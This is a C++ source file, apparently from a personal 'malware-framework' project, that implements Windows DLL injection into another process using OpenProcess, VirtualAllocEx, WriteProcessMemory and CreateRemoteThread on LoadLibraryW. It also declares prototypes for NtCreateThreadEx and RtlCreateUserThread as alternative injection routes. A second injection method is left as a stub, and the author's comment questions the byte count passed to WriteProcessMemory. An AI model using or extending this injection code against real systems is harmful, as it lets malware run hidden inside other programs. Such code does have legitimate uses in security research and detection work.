#include <Windows.h>
#include <tlHelp32.h>
#include <tchar.h>
#include <psapi.h>

#include <iostream>

#include "Process.h"

// Reorganize where this extends process.h and implements some methods here

bool Process::InjectDllNewThread() {
	//pRtlCreateUserThread RtlCreateUserThread = NULL;

	HANDLE hRemoteThread = NULL;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (hProcess == NULL) {
		std::cout << "Failed to open process";
		return false;
	}

	LPVOID LoadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

	return true;
}

bool Process::InjectDll() {
	typedef DWORD(WINAPI* prototype_NtCreateThreadEx)(
		PHANDLE                 ThreadHandle,
		ACCESS_MASK             DesiredAccess,
		LPVOID                  ObjectAttributes,
		HANDLE                  ProcessHandle,
		LPTHREAD_START_ROUTINE  lpStartAddress,
		LPVOID                  lpParameter,
		BOOL                    CreateSuspended,
		DWORD                   dwStackSize,
		DWORD                   Unknown1,
		DWORD                   Unknown2,
		LPVOID                  Unknown3
	);

	typedef DWORD(WINAPI* prototype_RtlCreateUserThread)(
		HANDLE      ProcessHandle,
		PSECURITY_DESCRIPTOR  SecurityDescriptor,
		BOOL      CreateSuspended,
		ULONG     StackZeroBits,
		PULONG     StackReserved,
		PULONG     StackCommit,
		LPVOID     StartAddress,
		LPVOID     StartParameter,
		HANDLE      ThreadHandle,
		LPVOID     ClientID
	);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPCWSTR dllPath = L"C:\\Users\\chase\\Desktop\\malware-framework\\src\\core\\Debug\\TESTDLL.dll";

	std::cout << "Using dll path " << dllPath << "\n";

	if (hProcess == NULL) {
		std::cout << "Failed to open process\n";
		return false;
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL) {
		std::cout << "Failed to get handle to kernel32.dll\n";
		return false;
	}

	LPVOID llBaseAddress = (LPVOID) GetProcAddress(hKernel32, "LoadLibraryW");
	if (llBaseAddress == NULL) {
		std::cout << "Failed to get LoadLibraryW base address\n";
		return false;
	}

	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpBaseAddress == NULL) {
		std::cout << "Failed to allocate in target process memory\n";
		return false;
	}

	SIZE_T* lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, dllPath, lstrlen(dllPath)*2-1, lpNumberOfBytesWritten); // Is lstrlen correct???
	if (!resWPM) {
		std::cout << "Failed to write process memory\n";
		return false;
	}

	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)llBaseAddress, lpBaseAddress, 0, (LPDWORD)(&ThreadId));
	if (hThread == NULL) {
		std::cout << "Failed to create remote thread\n";
		return false;
	}

	std::cout << "Done with injection\n";

	// Implement other two methods

	return true;
}